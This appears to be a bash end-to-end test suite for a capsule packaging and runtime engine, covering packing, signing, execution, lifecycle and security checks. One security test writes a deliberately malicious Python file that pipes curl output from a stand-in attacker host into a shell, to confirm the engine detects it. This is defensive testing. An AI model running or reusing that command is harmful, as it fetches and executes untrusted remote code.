#!/bin/bash
# =============================================================================
# Capsuled E2E Test Script
# UARC V1.1.0 Compliance Tests
# =============================================================================

# Note: NOT using set -e to allow tests to continue on individual failures

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
CAPSULED_BIN="$PROJECT_ROOT/target/release/capsuled"
CAPSULE_CLI="$PROJECT_ROOT/target/release/capsule"
TEST_DIR="/tmp/capsuled-e2e-$$"
ENGINE_LOG="$TEST_DIR/engine.log"
ENGINE_PORT="14500"  # Use non-default port for E2E tests
ENGINE_PID=""

# Counters
TESTS_PASSED=0
TESTS_FAILED=0
TESTS_SKIPPED=0

# =============================================================================
# Utility Functions
# =============================================================================

log_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[PASS]${NC} $1"
    TESTS_PASSED=$((TESTS_PASSED + 1))
}

log_fail() {
    echo -e "${RED}[FAIL]${NC} $1"
    TESTS_FAILED=$((TESTS_FAILED + 1))
}

log_skip() {
    echo -e "${YELLOW}[SKIP]${NC} $1"
    ((TESTS_SKIPPED++))
}

log_section() {
    echo ""
    echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${YELLOW}  $1${NC}"
    echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

cleanup() {
    log_info "Cleaning up..."
    
    # Stop engine
    if [ -n "$ENGINE_PID" ] && kill -0 "$ENGINE_PID" 2>/dev/null; then
        kill -9 "$ENGINE_PID" 2>/dev/null || true
    fi
    pkill -9 -f "capsuled" 2>/dev/null || true
    
    # Clean test directory
    rm -rf "$TEST_DIR"
    
    log_info "Cleanup complete"
}

trap cleanup EXIT

ensure_binaries() {
    if [ ! -x "$CAPSULED_BIN" ] || [ ! -x "$CAPSULE_CLI" ]; then
        log_info "Building release binaries..."
        cd "$PROJECT_ROOT"
        cargo build --release --bin capsuled -p capsuled
        cargo build --release --bin capsule -p capsule-cli
    fi
}

start_engine() {
    local allow_dev="${1:-0}"
    local pubkey="${2:-}"
    local enforce_sig="${3:-0}"
    
    log_info "Starting Engine (dev=$allow_dev, enforce_sig=$enforce_sig)"
    
    # Kill any existing engine
    pkill -9 -f "capsuled" 2>/dev/null || true
    sleep 1
    
    # Build env vars
    local env_vars=""
    [ "$allow_dev" = "1" ] && env_vars="CAPSULED_ALLOW_DEV_MODE=1 $env_vars"
    [ -n "$pubkey" ] && env_vars="CAPSULED_PUBKEY=$pubkey $env_vars"
    [ "$enforce_sig" = "1" ] && env_vars="CAPSULED_ENFORCE_SIGNATURES=1 $env_vars"
    
    # Start engine with HTTP port
    env $env_vars "$CAPSULED_BIN" --port "$ENGINE_PORT" > "$ENGINE_LOG" 2>&1 &
    ENGINE_PID=$!
    
    # Wait for HTTP server to be ready
    for i in {1..30}; do
        if curl -s "http://localhost:$ENGINE_PORT/health" >/dev/null 2>&1; then
            log_info "Engine started (PID: $ENGINE_PID, port: $ENGINE_PORT)"
            export CAPSULE_API_URL="http://localhost:$ENGINE_PORT"
            return 0
        fi
        # Also check if process is still alive
        if ! kill -0 "$ENGINE_PID" 2>/dev/null; then
            break
        fi
        sleep 0.5
    done
    
    log_fail "Engine failed to start"
    cat "$ENGINE_LOG"
    return 1
}

stop_engine() {
    if [ -n "$ENGINE_PID" ]; then
        kill -9 "$ENGINE_PID" 2>/dev/null || true
        ENGINE_PID=""
    fi
    pkill -9 -f "capsuled" 2>/dev/null || true
    sleep 1
}

# =============================================================================
# Supply Chain Tests
# =============================================================================

test_s1_pack() {
    log_section "S-1: Pack & CAS Generation"
    
    local test_dir="$TEST_DIR/s1"
    mkdir -p "$test_dir" && cd "$test_dir"
    
    # Create test app
    cat > main.py << 'EOF'
print("Hello from S-1 test")
EOF
    
    cat > capsule.toml << 'EOF'
schema_version = "1.0"
name = "test-s1"
version = "0.1.0"
type = "app"

[execution]
runtime = "source"
entrypoint = "main.py"

[targets]
preference = ["source"]

[targets.source]
language = "python"
entrypoint = "main.py"
dev_mode = true
EOF
    
    # Run pack
    if ! "$CAPSULE_CLI" pack 2>/dev/null; then
        log_fail "S-1: pack command failed"
        return
    fi
    
    # Verify .capsule exists
    if ! ls *.capsule >/dev/null 2>&1; then
        log_fail "S-1: .capsule file not created"
        return
    fi
    
    # Verify source_digest in manifest
    if ! cat *.capsule | grep -q "source_digest"; then
        log_fail "S-1: source_digest not found in manifest"
        return
    fi
    
    # Verify CAS blob
    local digest=$(cat *.capsule | jq -r '.targets.source_digest')
    local hash="${digest#sha256:}"
    if [ ! -f "$HOME/.capsule/cas/blobs/sha256-$hash" ]; then
        log_fail "S-1: CAS blob not found"
        return
    fi
    
    log_success "S-1: Pack & CAS generation"
}

test_s2_signed_pack() {
    log_section "S-2: Signed Pack"
    
    local test_dir="$TEST_DIR/s2"
    mkdir -p "$test_dir" && cd "$test_dir"
    
    # Generate key if needed
    "$CAPSULE_CLI" keygen --name e2e-test 2>/dev/null || true
    
    # Create test app
    cat > main.py << 'EOF'
print("Hello from S-2 test")
EOF
    
    cat > capsule.toml << 'EOF'
schema_version = "1.0"
name = "test-s2"
version = "0.1.0"
type = "app"

[execution]
runtime = "source"
entrypoint = "main.py"

[targets]
preference = ["source"]

[targets.source]
language = "python"
entrypoint = "main.py"
EOF
    
    # Pack with signature
    if ! "$CAPSULE_CLI" pack --key "$HOME/.capsule/keys/e2e-test.secret" 2>/dev/null; then
        log_fail "S-2: signed pack failed"
        return
    fi
    
    # Verify .sig exists and has content
    if ! ls *.sig >/dev/null 2>&1; then
        log_fail "S-2: .sig file not created"
        return
    fi
    
    local sig_size=$(stat -f%z *.sig 2>/dev/null || stat -c%s *.sig 2>/dev/null)
    if [ "$sig_size" -lt 100 ]; then
        log_fail "S-2: signature file too small ($sig_size bytes)"
        return
    fi
    
    log_success "S-2: Signed pack ($sig_size bytes signature)"
}

test_s3_gitignore() {
    log_section "S-3: .gitignore Exclusion"
    
    local test_dir="$TEST_DIR/s3"
    mkdir -p "$test_dir" && cd "$test_dir"
    
    # Create test files
    cat > main.py << 'EOF'
print("Hello from S-3 test")
EOF
    
    cat > capsule.toml << 'EOF'
schema_version = "1.0"
name = "test-s3"
version = "0.1.0"
type = "app"

[execution]
runtime = "source"
entrypoint = "main.py"

[targets]
preference = ["source"]

[targets.source]
language = "python"
entrypoint = "main.py"
EOF
    
    # Create ignored file
    echo "*.tmp" > .gitignore
    echo "secret data" > should_ignore.tmp
    
    # Pack
    "$CAPSULE_CLI" pack 2>/dev/null
    
    # Check archive contents
    local digest=$(cat *.capsule | jq -r '.targets.source_digest')
    local hash="${digest#sha256:}"
    
    if tar -tf "$HOME/.capsule/cas/blobs/sha256-$hash" 2>/dev/null | grep -q "should_ignore.tmp"; then
        log_fail "S-3: ignored file was included in archive"
        return
    fi
    
    log_success "S-3: .gitignore exclusion"
}

# =============================================================================
# Runtime Tests
# =============================================================================

test_r1_dev_mode() {
    log_section "R-1: Dev Mode Execution"
    
    local test_dir="$TEST_DIR/r1"
    mkdir -p "$test_dir" && cd "$test_dir"
    
    # Start engine with dev mode
    start_engine 1 "" 0
    
    # Create web server app
    cat > main.py << 'EOF'
from http.server import HTTPServer, BaseHTTPRequestHandler
import os
port = int(os.environ.get("PORT", "8080"))
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'R-1 Test OK')
    def log_message(self, format, *args):
        pass
httpd = HTTPServer(("0.0.0.0", port), H)
httpd.serve_forever()
EOF
    
    cat > capsule.toml << 'EOF'
schema_version = "1.0"
name = "test-r1"
version = "0.1.0"
type = "app"

[execution]
runtime = "source"
entrypoint = "main.py"

[routing]
type = "http"

[routing.ports]
HOST_PORT = "0"

[targets]
preference = ["source"]

[targets.source]
language = "python"
entrypoint = "main.py"
EOF
    
    # Open in dev mode (background)
    "$CAPSULE_CLI" open --dev > /dev/null 2>&1 &
    local open_pid=$!
    sleep 3
    
    # Check status
    local ps_output=$("$CAPSULE_CLI" ps 2>/dev/null)
    if ! echo "$ps_output" | grep -q "running"; then
        log_fail "R-1: capsule not running"
        kill $open_pid 2>/dev/null || true
        stop_engine
        return
    fi
    
    # Get port from engine log (URL in deploy complete message)
    local port=$(grep "deploy complete\|started, URL:" "$ENGINE_LOG" 2>/dev/null | tail -1 | grep -oE 'localhost:[0-9]+' | cut -d: -f2)
    
    if [ -n "$port" ] && curl -s "http://localhost:$port" 2>/dev/null | grep -q "R-1 Test OK"; then
        log_success "R-1: Dev mode execution (port $port)"
    else
        log_fail "R-1: HTTP response failed (port=$port)"
        echo "Engine log tail:"
        tail -5 "$ENGINE_LOG" 2>/dev/null || true
    fi
    
    # Cleanup
    "$CAPSULE_CLI" close test-r1 2>/dev/null || true
    kill $open_pid 2>/dev/null || true
    stop_engine
}

test_r2_prod_mode() {
    log_section "R-2: Prod Mode Execution (CAS)"
    
    local test_dir="$TEST_DIR/r2"
    mkdir -p "$test_dir" && cd "$test_dir"
    
    # Create and pack app
    cat > main.py << 'EOF'
print("R-2 Prod Test Complete")
import time
time.sleep(3)
EOF
    
    cat > capsule.toml << 'EOF'
schema_version = "1.0"
name = "test-r2"
version = "0.1.0"
type = "app"

[execution]
runtime = "source"
entrypoint = "main.py"

[targets]
preference = ["source"]

[targets.source]
language = "python"
entrypoint = "main.py"
EOF
    
    "$CAPSULE_CLI" keygen --name e2e-prod 2>/dev/null || true
    "$CAPSULE_CLI" pack --key "$HOME/.capsule/keys/e2e-prod.secret" 2>/dev/null
    
    # Get pubkey (base64 encoded)
    local pubkey=$(base64 < "$HOME/.capsule/keys/e2e-prod.public")
    
    # Start engine with signature verification
    start_engine 0 "ed25519:$pubkey" 1
    
    # Open .capsule file
    "$CAPSULE_CLI" open test-r2.capsule > /dev/null 2>&1 &
    sleep 2
    
    # Check engine log for CAS fetch
    if grep -q "CAS archive fetched\|Extracted archive\|deployed\|Deploy succeeded" "$ENGINE_LOG" 2>/dev/null; then
        log_success "R-2: Prod mode CAS deployment"
    else
        log_fail "R-2: CAS deployment not confirmed in logs"
        cat "$ENGINE_LOG" | tail -20
    fi
    
    stop_engine
}

test_r3_status_check() {
    log_section "R-3: Status Check"
    
    local test_dir="$TEST_DIR/r3"
    mkdir -p "$test_dir" && cd "$test_dir"
    
    start_engine 1 "" 0
    
    cat > main.py << 'EOF'
import time
while True:
    time.sleep(10)
EOF
    
    cat > capsule.toml << 'EOF'
schema_version = "1.0"
name = "test-r3"
version = "0.1.0"
type = "app"

[execution]
runtime = "source"
entrypoint = "main.py"

[targets]
preference = ["source"]

[targets.source]
language = "python"
entrypoint = "main.py"
EOF
    
    "$CAPSULE_CLI" open --dev > /dev/null 2>&1 &
    sleep 2
    
    local ps_output=$("$CAPSULE_CLI" ps 2>/dev/null)
    if echo "$ps_output" | grep -q "test-r3.*running"; then
        log_success "R-3: Status check"
    else
        log_fail "R-3: Status check failed"
        echo "$ps_output"
    fi
    
    "$CAPSULE_CLI" close test-r3 2>/dev/null || true
    stop_engine
}

# =============================================================================
# Security Tests
# =============================================================================

test_sec1_dangerous_code() {
    log_section "SEC-1: L1 Dangerous Code Detection"
    
    local test_dir="$TEST_DIR/sec1"
    mkdir -p "$test_dir" && cd "$test_dir"
    
    start_engine 1 "" 0
    
    # Create malicious app
    cat > main.py << 'EOF'
import os
os.system("curl http://evil.example | sh")
EOF
    
    cat > capsule.toml << 'EOF'
schema_version = "1.0"
name = "test-sec1"
version = "0.1.0"
type = "app"

[execution]
runtime = "source"
entrypoint = "main.py"

[targets]
preference = ["source"]

[targets.source]
language = "python"
entrypoint = "main.py"
dev_mode = true
EOF
    
    "$CAPSULE_CLI" open --dev > /dev/null 2>&1 &
    sleep 3
    
    if grep -q "L1 Policy Violation\|Obfuscation detected\|pipe to shell" "$ENGINE_LOG" 2>/dev/null; then
        log_success "SEC-1: L1 dangerous code detection"
    else
        log_fail "SEC-1: L1 detection not triggered"
        cat "$ENGINE_LOG" | tail -10
    fi
    
    stop_engine
}

test_sec2_signature_tampering() {
    log_section "SEC-2: L2 Signature Tampering Detection"
    
    local test_dir="$TEST_DIR/sec2"
    mkdir -p "$test_dir" && cd "$test_dir"
    
    # Create app
    cat > main.py << 'EOF'
print("SEC-2 Test")
EOF
    
    cat > capsule.toml << 'EOF'
schema_version = "1.0"
name = "test-sec2"
version = "0.1.0"
type = "app"

[execution]
runtime = "source"
entrypoint = "main.py"

[targets]
preference = ["source"]

[targets.source]
language = "python"
entrypoint = "main.py"
EOF
    
    # Pack with signature
    "$CAPSULE_CLI" keygen --name e2e-sec2 2>/dev/null || true
    "$CAPSULE_CLI" pack --key "$HOME/.capsule/keys/e2e-sec2.secret" 2>/dev/null
    
    # Tamper with manifest
    python3 -c "
import json
with open('test-sec2.capsule', 'r') as f:
    data = json.load(f)
data['version'] = '9.9.9'
with open('test-sec2.capsule', 'w') as f:
    json.dump(data, f)
"
    
    # Start engine with pubkey (base64 encoded)
    local pubkey=$(base64 < "$HOME/.capsule/keys/e2e-sec2.public")
    start_engine 0 "ed25519:$pubkey" 1
    
    "$CAPSULE_CLI" open test-sec2.capsule > /dev/null 2>&1 &
    sleep 3
    
    if grep -q "signature verification failed\|Cryptographic verification failed" "$ENGINE_LOG" 2>/dev/null; then
        log_success "SEC-2: Signature tampering detection"
    else
        log_fail "SEC-2: Tampering not detected"
        cat "$ENGINE_LOG" | tail -10
    fi
    
    stop_engine
}

test_sec5_unsigned_rejection() {
    log_section "SEC-5: Unsigned Capsule Rejection"
    
    local test_dir="$TEST_DIR/sec5"
    mkdir -p "$test_dir" && cd "$test_dir"
    
    # Create app and pack WITHOUT signature
    cat > main.py << 'EOF'
print("SEC-5 Test")
EOF
    
    cat > capsule.toml << 'EOF'
schema_version = "1.0"
name = "test-sec5"
version = "0.1.0"
type = "app"

[execution]
runtime = "source"
entrypoint = "main.py"

[targets]
preference = ["source"]

[targets.source]
language = "python"
entrypoint = "main.py"
EOF
    
    "$CAPSULE_CLI" pack 2>/dev/null
    
    # Start engine with signature enforcement
    "$CAPSULE_CLI" keygen --name e2e-sec5 2>/dev/null || true
    local pubkey=$(base64 < "$HOME/.capsule/keys/e2e-sec5.public")
    start_engine 0 "ed25519:$pubkey" 1
    
    "$CAPSULE_CLI" open test-sec5.capsule > /dev/null 2>&1 &
    sleep 3
    
    if grep -q "signature is required but missing" "$ENGINE_LOG" 2>/dev/null; then
        log_success "SEC-5: Unsigned capsule rejection"
    else
        log_fail "SEC-5: Unsigned capsule was not rejected"
        cat "$ENGINE_LOG" | tail -10
    fi
    
    stop_engine
}

# =============================================================================
# Lifecycle Tests
# =============================================================================

test_l1_long_running() {
    log_section "L-1: Long Running Process (10s test)"
    
    local test_dir="$TEST_DIR/l1"
    mkdir -p "$test_dir" && cd "$test_dir"
    
    start_engine 1 "" 0
    
    cat > main.py << 'EOF'
import time
for i in range(30):
    print(f"Running... {i}", flush=True)
    time.sleep(1)
EOF
    
    cat > capsule.toml << 'EOF'
schema_version = "1.0"
name = "test-l1"
version = "0.1.0"
type = "app"

[execution]
runtime = "source"
entrypoint = "main.py"

[targets]
preference = ["source"]

[targets.source]
language = "python"
entrypoint = "main.py"
EOF
    
    "$CAPSULE_CLI" open --dev > /dev/null 2>&1 &
    sleep 12
    
    local ps_output=$("$CAPSULE_CLI" ps 2>/dev/null)
    if echo "$ps_output" | grep -q "test-l1.*running"; then
        log_success "L-1: Long running process (10+ seconds)"
    else
        log_fail "L-1: Process died prematurely"
    fi
    
    "$CAPSULE_CLI" close test-l1 2>/dev/null || true
    stop_engine
}

test_l2_log_flood() {
    log_section "L-2: Log Flood Stability"
    
    local test_dir="$TEST_DIR/l2"
    mkdir -p "$test_dir" && cd "$test_dir"
    
    start_engine 1 "" 0
    
    cat > main.py << 'EOF'
for i in range(500):
    print(f"Log line {i} - " + "x" * 100, flush=True)
import time
time.sleep(2)
EOF
    
    cat > capsule.toml << 'EOF'
schema_version = "1.0"
name = "test-l2"
version = "0.1.0"
type = "app"

[execution]
runtime = "source"
entrypoint = "main.py"

[targets]
preference = ["source"]

[targets.source]
language = "python"
entrypoint = "main.py"
EOF
    
    "$CAPSULE_CLI" open --dev > /dev/null 2>&1 &
    sleep 5
    
    # Check engine didn't crash
    if kill -0 "$ENGINE_PID" 2>/dev/null; then
        log_success "L-2: Log flood stability"
    else
        log_fail "L-2: Engine crashed under log flood"
    fi
    
    "$CAPSULE_CLI" close test-l2 2>/dev/null || true
    stop_engine
}

# =============================================================================
# Main Test Runner
# =============================================================================

run_all_tests() {
    log_section "CAPSULED E2E TEST SUITE"
    log_info "Test directory: $TEST_DIR"
    
    mkdir -p "$TEST_DIR"
    
    ensure_binaries
    
    # Supply Chain Tests
    test_s1_pack
    test_s2_signed_pack
    test_s3_gitignore
    
    # Runtime Tests
    test_r1_dev_mode
    test_r2_prod_mode
    test_r3_status_check
    
    # Security Tests
    test_sec1_dangerous_code
    test_sec2_signature_tampering
    test_sec5_unsigned_rejection
    
    # Lifecycle Tests
    test_l1_long_running
    test_l2_log_flood
    
    # Summary
    log_section "TEST RESULTS"
    echo ""
    echo -e "  ${GREEN}Passed:${NC}  $TESTS_PASSED"
    echo -e "  ${RED}Failed:${NC}  $TESTS_FAILED"
    echo -e "  ${YELLOW}Skipped:${NC} $TESTS_SKIPPED"
    echo ""
    
    if [ "$TESTS_FAILED" -gt 0 ]; then
        echo -e "${RED}❌ E2E TESTS FAILED${NC}"
        exit 1
    else
        echo -e "${GREEN}✅ ALL E2E TESTS PASSED${NC}"
        exit 0
    fi
}

run_security_only() {
    log_section "SECURITY TESTS ONLY"
    mkdir -p "$TEST_DIR"
    ensure_binaries
    
    test_sec1_dangerous_code
    test_sec2_signature_tampering
    test_sec5_unsigned_rejection
    
    log_section "SECURITY TEST RESULTS"
    echo -e "  ${GREEN}Passed:${NC}  $TESTS_PASSED"
    echo -e "  ${RED}Failed:${NC}  $TESTS_FAILED"
    
    [ "$TESTS_FAILED" -gt 0 ] && exit 1 || exit 0
}

run_quick() {
    log_section "QUICK TESTS (No long-running)"
    mkdir -p "$TEST_DIR"
    ensure_binaries
    
    test_s1_pack
    test_s2_signed_pack
    test_r3_status_check
    test_sec1_dangerous_code
    
    log_section "QUICK TEST RESULTS"
    echo -e "  ${GREEN}Passed:${NC}  $TESTS_PASSED"
    echo -e "  ${RED}Failed:${NC}  $TESTS_FAILED"
    
    [ "$TESTS_FAILED" -gt 0 ] && exit 1 || exit 0
}

# Parse arguments
case "${1:-}" in
    --security-only)
        run_security_only
        ;;
    --quick)
        run_quick
        ;;
    --help)
        echo "Usage: $0 [OPTIONS]"
        echo ""
        echo "Options:"
        echo "  --security-only  Run security tests only"
        echo "  --quick          Run quick smoke tests"
        echo "  --help           Show this help"
        echo ""
        exit 0
        ;;
    *)
        run_all_tests
        ;;
esac
